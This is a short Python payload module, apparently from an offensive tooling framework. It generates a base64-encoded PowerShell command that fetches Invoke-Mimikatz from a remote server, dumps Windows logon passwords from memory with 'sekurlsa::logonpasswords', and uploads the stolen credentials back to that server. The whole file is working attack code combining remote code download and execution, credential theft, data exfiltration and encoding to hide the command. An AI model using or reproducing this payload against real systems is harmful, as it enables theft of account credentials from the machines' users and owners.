import sys
sys.path.append("..")
from ressources import get_ressource_md5, powershell_encode_base64

class Payload:
    name = 'Mimikatz'
    args = ['Server_IP:Server_port']

    def generate_payload(self, url):
        # Mimikatz in memory in memory

        if not url.startswith('http://'):
            url = 'http://' + url

        # Stage1: load Invoke-Mimikatz.ps1
        pwsh_md5 = get_ressource_md5("Invoke-Mimikatz.ps1")
        stage1 = 'IEX(New-Object Net.WebClient).DownloadString("%s/ressources/%s")' % (url, pwsh_md5)

        # Stage2: execute mimikatz
        stage2 = '$Out = Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords exit"'

        # Stage4: post result
        stage3 = '(New-Object Net.WebClient).UploadString("%s/ressources/%s", $Out)' % (url, 'mimikatz.txt')

        payload = ';'.join([stage1, stage2, stage3])

        return "powershell.exe -e %s" % powershell_encode_base64(payload)


